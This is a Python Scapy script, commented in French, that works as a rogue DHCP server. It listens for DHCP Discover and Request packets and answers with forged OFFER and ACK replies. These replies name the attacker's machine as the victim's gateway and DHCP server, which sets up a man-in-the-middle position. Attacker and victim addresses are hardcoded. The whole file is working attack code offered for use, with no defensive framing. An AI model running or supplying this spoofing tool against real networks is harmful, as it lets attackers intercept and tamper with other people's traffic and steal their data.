import codecs
import random
from scapy.all import sniff, sendp, BOOTP, DHCP, Ether, IP, UDP

# Paramètres de l'attaquant
ATTACKER_IP = "10.1.1.101"  # Adresse IP de l'attaquant
ATTACKER_MAC = "bc:24:11:e6:a3:35" # Adresse MAC attaquant
VICTIM_IP = "10.1.1.37"  # Adresse IP attribuée à la victime
DNS_IP = "1.1.1.1"  # Adresse du serveur DNS
IFACE = "ens18"  # Interface réseau à surveiller

def send_dhcp_offer(xid, victim_mac):
    """Envoie une réponse DHCP OFFER à la victime."""
    pkt = Ether(src=ATTACKER_MAC, dst=victim_mac) / \
          IP(src=ATTACKER_IP, dst="255.255.255.255") / \
          UDP(sport=67, dport=68) / \
          BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=ATTACKER_IP,
                chaddr=codecs.decode(victim_mac.replace(':', ''), 'hex'),
                xid=xid) / \
          DHCP(options=[
              ("message-type", "offer"),
              ("server_id", ATTACKER_IP),
              ("router", ATTACKER_IP),
              ("name_server", DNS_IP),
              ("lease_time", 3600),
              ("subnet_mask", "255.255.255.0"),
              "end"
          ])
    sendp(pkt, iface=IFACE, verbose=True)

def send_dhcp_ack(xid, victim_mac):
    """Envoie une réponse DHCP ACK pour confirmer l'attribution de l'IP."""
    pkt = Ether(src=ATTACKER_MAC, dst=victim_mac) / \
          IP(src=ATTACKER_IP, dst="255.255.255.255") / \
          UDP(sport=67, dport=68) / \
          BOOTP(op=2, yiaddr=VICTIM_IP, siaddr=ATTACKER_IP,
                chaddr=codecs.decode(victim_mac.replace(':', ''), 'hex'),
                xid=xid) / \
          DHCP(options=[
              ("message-type", "ack"),
              ("server_id", ATTACKER_IP),
              ("router", ATTACKER_IP),
              ("name_server", DNS_IP),
              ("lease_time", 3600),
              ("subnet_mask", "255.255.255.0"),
              "end"
          ])
    sendp(pkt, iface=IFACE, verbose=True)

def dhcp_sniffer(packet):
    """Capture les requêtes DHCP et répond avec un DHCP OFFER/ACK."""
    if packet.haslayer(DHCP):
        dhcp_options = {opt[0]: opt[1] for opt in packet[DHCP].options if isinstance(opt, tuple)}

        if "message-type" in dhcp_options:
            msg_type = dhcp_options["message-type"]
            xid = packet[BOOTP].xid
            victim_mac = packet[Ether].src

            if msg_type == 1:  # DHCP Discover
                print(f"[+] Reçu DHCP DISCOVER de {victim_mac}. Envoi d'un DHCP OFFER...")
                send_dhcp_offer(xid, victim_mac)

            elif msg_type == 3:  # DHCP Request
                print(f"[+] Reçu DHCP REQUEST de {victim_mac}. Envoi d'un DHCP ACK...")
                send_dhcp_ack(xid, victim_mac)

# Exécution continue du sniffer DHCP
print("[*] Écoute des requêtes DHCP sur l'interface", IFACE)
sniff(filter="udp and (port 67 or port 68)", prn=dhcp_sniffer, iface=IFACE, store=0)
